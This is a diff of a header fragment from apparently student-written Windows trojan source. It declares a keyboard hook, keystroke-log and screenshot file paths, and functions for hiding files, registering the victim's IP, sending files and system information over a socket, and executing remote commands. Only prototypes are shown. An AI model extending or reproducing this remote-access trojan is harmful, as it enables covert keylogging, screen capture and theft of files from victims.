@@ -16,7 +16,7 @@ email: forec@bupt.edu.cn
 #include <string.h>
 #include <lm.h>
 
-#define MAXLEN 10000
+#define MAXLEN 20000
 
 #define RECV_BUFLEN MAXLEN
 #define SEND_BUFLEN MAXLEN
@@ -29,13 +29,15 @@ email: forec@bupt.edu.cn
 #pragma comment(lib, "netapi32.lib")
 
 const char g_szClassName[] = "trojanWindow";
-const char keyboard_save_file[] = "C:\\key.log";
-const char screenshot_save_file[] = "C:\\screen.bmp";
+const char keyboard_save_file[] = "E:\\key.log";
+const char screenshot_save_file[] = "E:\\screen.bmp";
 
-HHOOK hook; 
-char keyBuffer[KEY_BUFLEN];
+extern HHOOK hook; 
+extern HANDLE hMutex;
+extern char keyBuffer[KEY_BUFLEN];
+extern char temp[MAXLEN + 4];
 
-inline LPCWSTR stringToLPCWSTR(char *src);
+inline LPCWSTR stringToLPCWSTR(const char *src);
 
 bool getScreenShot(const char *path);
 
@@ -43,7 +45,7 @@ bool hideFile(const char *path);
 
 bool registerIP(char *info);
 
-bool sendFile(SOCKET &socket, char *path);
+bool sendFile(SOCKET &socket, const char *path);
 
 bool sendSystemInfo(SOCKET &socket);
 
@@ -55,7 +57,9 @@ bool dealWithCommand(char *sendBuf, char *recvBuf, int recvLen, SOCKET &socket);
 
 unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen);
 
-unsigned int send_s(SOCKET &sock, char *buf, INT32 sendlen);
+int send_s(SOCKET &sock, const char *buf, INT32 sendlen);
+
+int recv_s(SOCKET &sock, char *buf, unsigned int buflen);
 
 void RegisterTrojanWindow(HINSTANCE hInstance);
 
